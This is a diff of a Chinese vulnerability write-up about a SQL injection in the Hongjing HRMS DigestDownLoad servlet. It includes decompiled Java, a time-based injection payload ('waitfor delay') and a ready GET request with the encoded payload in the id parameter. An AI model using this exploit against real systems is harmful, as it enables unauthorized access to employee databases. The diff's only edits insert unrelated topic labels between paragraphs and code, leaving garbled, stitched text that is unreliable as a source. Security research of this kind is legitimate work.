@@ -33,6 +33,14 @@ asset_dir: embedded-base64
 
 跟进 `com.hjsj.hrms.servlet.lawbase.DigestDownLoad` 类
 
+深入探索
+
+人力资源
+
+脚本语言
+
+Java（编程语言）
+
 ```
 public void doGet(HttpServletRequest var1, HttpServletResponse var2) throws ServletException, IOException {
         String var3 = var1.getParameter("id");
@@ -79,11 +87,11 @@ public static final String decode(String var0) {
 
 深入探索
 
-数据
+计算机科学
 
-blog
+商务软件和生产力软件
 
-工程与技术
+人力资源管理系统
 
 ```
 public static String decrypt(String var0) {
@@ -129,7 +137,7 @@ if (var4.equalsIgnoreCase("original")) {
 
 [漏洞利用](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)使用 `1'waitfor delay'0:0:5'--` 加密编码后来测试
 
-脚本语言
+字典与百科全书
 
 ```
 GET /servlet/DigestDownLoad?id=SPAATTP~32HJFPAATTPJPAATTP~32HJFPAATTPHNvno~33W~39Sm~33WBgDEqPAATTP~32HJFPAATTPWzCGPAATTP~32HJBPAATTPS~30TBXpcPpPAATTP~32HJFPAATTP~37~39l~37h~38PAATTP~33HJDPAATTP HTTP/1.1
